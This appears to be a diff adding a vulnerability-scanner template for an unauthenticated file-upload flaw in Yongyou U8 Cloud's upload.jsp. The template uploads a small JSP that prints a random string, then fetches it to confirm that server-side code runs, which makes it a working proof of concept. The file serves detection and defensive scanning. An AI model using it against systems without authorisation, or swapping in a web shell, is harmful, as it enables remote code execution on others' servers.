@@ -1,0 +1,45 @@
+id: yongyou-u8cloud-file-upload
+info:
+  name: Yongyou U8 Cloud upload.jsp File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  fname: "{{rand_base(8)}}"
+  str1: "{{rand_base(8)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-check
+    method: POST
+    path:
+      - "{{BaseURL}}/linux/pages/upload.jsp"
+    headers: 
+      Content-Type: application/x-www-form-urlencoded
+      filename: "{{fname}}.jsp"
+    body: |
+      <% out.println("{{str1}}");%>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "File upload success!"
+
+  - id: file-verification
+    method: GET
+    path:
+      - "{{BaseURL}}/linux/{{fname}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{str1}}"
